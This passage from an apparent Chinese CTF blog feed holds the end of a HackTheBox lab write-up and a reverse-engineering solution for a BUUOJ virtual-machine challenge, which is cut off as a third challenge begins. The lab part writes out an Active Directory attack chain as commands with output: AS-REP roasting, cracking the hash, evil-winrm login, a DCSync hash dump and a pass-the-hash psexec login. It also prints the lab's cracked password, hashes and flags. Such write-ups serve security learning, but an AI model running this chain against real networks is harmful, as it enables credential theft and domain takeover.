href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p></blockquote><blockquote><p>mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />《内网安全攻防》 P.296</p></blockquote><p>如果能够拿到用户<code>svc_bes</code>的凭证, 就能够使用dcsync攻击<br />所以尝试获取用户<code>svc_bes</code>的Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc_bes</span><br><span class="line">$krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee<span class="variable">$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e</span></span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Sheffield19      ($krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL)</span><br></pre></td></tr></table></figure><p>这里本来打算用psexec直接登入, 但是出现了权限不足的错误<br /><s><code>python psexec.py megacorp.local/svc_bes@10.10.10.30</code></s></p><p>使用Winrm服务登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19</span><br><span class="line"><span class="built_in">type</span> C:\users\svc_bes\desktop\user.txt</span><br><span class="line">b05fb166688a8603d970c6d033f637f1</span><br></pre></td></tr></table></figure><p>dcsync攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::</span><br></pre></td></tr></table></figure><p>使用Hash登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">ee613b2d048303e5fd4ac6647d944645</span><br></pre></td></tr></table></figure><hr /><p>几台靶机下来还是学到了不少东西<br /><s>还是自己太菜了</s><br />剩下的StartPoint靶机需要VIP才能访问<br />等哪天心血来潮开了VIP再说吧</p><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;借着HTB多学一些Windows下的渗透技巧&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Reverse_3</title>
    <link href="https://yoloyolo.top/2021/05/31/Reverse-3/"/>
    <id>https://yoloyolo.top/2021/05/31/Reverse-3/</id>
    <published>2021-05-31T21:16:43.000Z</published>
    <updated>2021-06-10T14:25:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>随缘刷题</p><a id="more"></a><h1 id="网鼎杯-2020-青龙组singal"><a class="markdownIt-Anchor" href="#网鼎杯-2020-青龙组singal"></a> [网鼎杯 2020 青龙组]singal</h1><p>链接: <a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal">https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]singal</a></p><p>EXE 32</p><p>IDA中 <strong>_main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, dword_403040, <span class="number">456u</span>);</span><br><span class="line">  vm_operad(v4, <span class="number">114</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>dword_403040</code>只运算最低一字节</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dword_403040 = [</span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x51</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x36</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x22</span>, <span class="number">0x07</span>, <span class="number">0x3F</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x07</span>, <span class="number">0x32</span>, <span class="number">0x07</span>, <span class="number">0x72</span>, <span class="number">0x07</span>, <span class="number">0x33</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x07</span>, <span class="number">0xF1</span>, <span class="number">0x07</span>, <span class="number">0x28</span>, <span class="number">0x07</span>, <span class="number">0x84</span>, <span class="number">0x07</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0x1E</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x7A</span>]</span><br></pre></td></tr></table></figure><p>跟进到 <strong>vm_operad</strong> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = Str[v8] - LOBYTE(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        Str[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(Str);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = Str[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = Str[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这里的switch语句来分析<br />switch里对于各个数值的操作有些与CPU指令相似<br /><s>原来这就是虚拟机逆向啊</s></p><ul><li><code>0x01</code>和<code>0x08</code>分别决定计算结果的存储位置</li><li><code>0x02</code>计算加法, <code>0x03</code>计算减法, <code>0x04</code>计算异或, <code>0x05</code>计算乘法</li><li><code>0x0B</code>自增, <code>0x1C</code>自减</li><li><code>0x0A</code>输入, <code>0x07</code>用于校验加密后的结果</li></ul><p>然后照着代码把虚拟机函数反着写一遍即可获得flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">a1 = [</span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x51</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x36</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>]</span><br><span class="line">a1.reverse()</span><br><span class="line">a2 = [</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x22</span>, <span class="number">0x07</span>, <span class="number">0x3F</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x07</span>, <span class="number">0x32</span>, <span class="number">0x07</span>, <span class="number">0x72</span>, <span class="number">0x07</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, </span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x07</span>, <span class="number">0xF1</span>, <span class="number">0x07</span>, <span class="number">0x28</span>, <span class="number">0x07</span>, <span class="number">0x84</span>, <span class="number">0x07</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0x1E</span>, <span class="number">0x07</span>, <span class="number">0x7A</span>]</span><br><span class="line">cipher = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a2)):</span><br><span class="line"><span class="keyword">if</span> a2[_] == <span class="number">0x07</span>:</span><br><span class="line">cipher.append(a2[_+<span class="number">1</span>])</span><br><span class="line">cipher.reverse()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> v9 &lt; <span class="built_in">len</span>(a1)-<span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> a1[v9] == <span class="number">0x01</span>:</span><br><span class="line">v4 = cipher[v6]</span><br><span class="line">v6 += <span class="number">1</span></span><br><span class="line">v8 += <span class="number">1</span></span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> a1[v9+<span class="number">1</span>] == <span class="number">0x02</span>:</span><br><span class="line">v8 = v4 - a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x03</span>:</span><br><span class="line">v8 = v4 + a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x04</span>:</span><br><span class="line">v8 = v4 ^ a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x05</span>:</span><br><span class="line">v8 = v4 // a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x06</span>:</span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x0B</span>:</span><br><span class="line">v8 = v4 + <span class="number">1</span></span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x0C</span>:</span><br><span class="line">v8 = v4 - <span class="number">1</span></span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x08</span>:</span><br><span class="line">v4 = v8</span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> a1[v9+<span class="number">1</span>] == <span class="number">0x02</span>:</span><br><span class="line">v8 = v4 - a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x03</span>:</span><br><span class="line">v8 = v4 + a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x04</span>:</span><br><span class="line">v8 = v4 ^ a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9+<span class="number">1</span>] == <span class="number">0x05</span>:</span><br><span class="line">v8 = v4 // a1[v9]</span><br><span class="line">v9 += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x06</span>:</span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x0B</span>:</span><br><span class="line">v8 = v4 + <span class="number">1</span></span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> a1[v9] == <span class="number">0x0C</span>:</span><br><span class="line">v8 = v4 - <span class="number">1</span></span><br><span class="line">v9 += <span class="number">1</span></span><br><span class="line">flag += <span class="built_in">chr</span>(v8)</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + flag[::-<span class="number">1</span>] + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{757515121f3d478}</strong></p></blockquote><hr /><h1 id="gxyctf2019simple-cpp"><a class="markdownIt-Anchor" href="#gxyctf2019simple-cpp"></a> [GXYCTF2019]simple CPP</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BGXYCTF2019%5Dsimple%20CPP">https://buuoj.cn/challenges#[GXYCTF2019]simple CPP</a></p><p>EXE 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span 